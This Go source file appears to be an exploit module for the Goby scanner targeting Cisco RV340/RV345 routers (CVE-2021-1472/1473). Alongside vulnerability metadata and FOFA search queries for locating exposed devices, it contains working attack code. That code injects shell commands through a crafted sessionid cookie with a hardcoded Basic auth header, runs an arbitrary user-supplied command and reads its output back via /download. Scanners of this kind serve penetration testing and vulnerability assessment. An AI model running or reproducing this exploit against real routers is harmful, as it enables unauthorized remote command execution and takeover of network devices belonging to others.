package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Cisco RV340 RCE (CVE-2021-1473)",
    "Description": "<p>The Cisco RV34x series dual wide area network (WAN) gigabit virtual private network (VPN) security routers are next-generation high-performance routers. Terminal devices and applications can be identified and processed according to user-defined policies to improve productivity and optimize network usage.</p><p>Cisco RV34X Series - Authentication Bypass and Remote Command Execution.</p>",
    "Impact": "Cisco RV340 RCE (CVE-2021-1473)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.cisco.com\">https://www.cisco.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Cisco",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Cisco RV340 远程命令执行漏洞（CVE-2021-1473）",
            "Description": "<p>Cisco RV34x系列双重广域网(WAN)千兆位虚拟专用网络(VPN)安全路由器是下一代高性能路由器。可以根据用户定义的策略识别和处理终端设备和应用程序，以提高生产力和优化网络使用。</p><p>Cisco RV34X 系列 - 身份验证绕过和远程命令执行漏洞，攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
            "Impact": "<p>Cisco RV34X 系列 - 身份验证绕过和远程命令执行,，攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://www.cisco.com\">https://www.cisco.com</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Cisco",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Cisco RV340 RCE (CVE-2021-1473)",
            "Description": "<p>The Cisco RV34x series dual wide area network (WAN) gigabit virtual private network (VPN) security routers are next-generation high-performance routers. Terminal devices and applications can be identified and processed according to user-defined policies to improve productivity and optimize network usage.</p><p>Cisco RV34X Series - Authentication Bypass and Remote Command Execution.</p>",
            "Impact": "Cisco RV340 RCE (CVE-2021-1473)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.cisco.com\">https://www.cisco.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Cisco",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "(title=\"Cisco RV340\" || banner=\"CISCO RV340\" || cert=\"RV340\") || (title=\"Cisco RV340W\") || (title=\"Cisco RV345\" || cert=\"RV345\") || (title=\"Cisco RV345P\")",
    "GobyQuery": "(title=\"Cisco RV340\" || banner=\"CISCO RV340\" || cert=\"RV340\") || (title=\"Cisco RV340W\") || (title=\"Cisco RV345\" || cert=\"RV345\") || (title=\"Cisco RV345P\")",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.cisco.com",
    "DisclosureDate": "2021-05-27",
    "References": [
        "https://www.iot-inspector.com/blog/advisory-cisco-rv34x-authentication-bypass-remote-command-execution/",
        "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sb-rv34x-rce-8bfG2h6b"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2021-1472",
        "CVE-2021-1473"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": [
            "Cisco RV340"
        ]
    },
    "PocId": "10227"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			Rand1 := goutils.RandomHexString(4)
			Rand2 := goutils.RandomHexString(4)
			RandName := goutils.RandomHexString(4)
			uri1 := "/upload"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.Header.Store("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15")
			cfg1.Header.Store("Authorization", "Basic YWRtaW46MTIz")
			cfg1.Header.Store("Cookie", "sessionid='$(echo "+Rand1+"\"\""+Rand2+" >/tmp/download/"+RandName+") #")
			cfg1.Header.Store("Content-Type", "multipart/form-data; boundary=80923809238490238409238409")
			cfg1.Data = `--80923809238490238409238409
Content-Disposition: form-data; name="file.path"
/tmp/upload.input
--80923809238490238409238409
Content-Disposition: form-data; name="input"
usa.img
--80923809238490238409238409
Content-Disposition: form-data; name="filename"
input.img
--80923809238490238409238409
Content-Disposition: form-data; name="fileparam"
usa
--80923809238490238409238409
Content-Disposition: form-data; name="filename"; filename="input.img"
usa
--80923809238490238409238409
Content-Disposition: form-data; name="option"
1
--80923809238490238409238409
Content-Disposition: form-data; name="destination"
1
--80923809238490238409238409--`
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp1.StatusCode == 200 {
					uri2 := "/download/" + RandName
					cfg2 := httpclient.NewGetRequestConfig(uri2)
					cfg2.Header.Store("Authorization", "Basic YWRtaW46MTIz")
					cfg2.VerifyTls = false
					if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
						return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, Rand1+Rand2)
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			RandName := goutils.RandomHexString(4)
			uri1 := "/upload"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.Header.Store("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15")
			cfg1.Header.Store("Authorization", "Basic YWRtaW46MTIz")
			cfg1.Header.Store("Cookie", "sessionid='$("+cmd+" >/tmp/download/"+RandName+") #")
			cfg1.Header.Store("Content-Type", "multipart/form-data; boundary=80923809238490238409238409")
			cfg1.Data = `--80923809238490238409238409
Content-Disposition: form-data; name="file.path"
/tmp/upload.input
--80923809238490238409238409
Content-Disposition: form-data; name="input"
usa.img
--80923809238490238409238409
Content-Disposition: form-data; name="filename"
input.img
--80923809238490238409238409
Content-Disposition: form-data; name="fileparam"
usa
--80923809238490238409238409
Content-Disposition: form-data; name="filename"; filename="input.img"
usa
--80923809238490238409238409
Content-Disposition: form-data; name="option"
1
--80923809238490238409238409
Content-Disposition: form-data; name="destination"
1
--80923809238490238409238409--`
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp1.StatusCode == 200 {
					uri2 := "/download/" + RandName
					cfg2 := httpclient.NewGetRequestConfig(uri2)
					cfg2.Header.Store("Authorization", "Basic YWRtaW46MTIz")
					cfg2.VerifyTls = false
					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
						if resp2.StatusCode == 200 {
							expResult.Output = resp2.RawBody
							expResult.Success = true
						}
					}
				}
			}
			return expResult
		},
	))
}
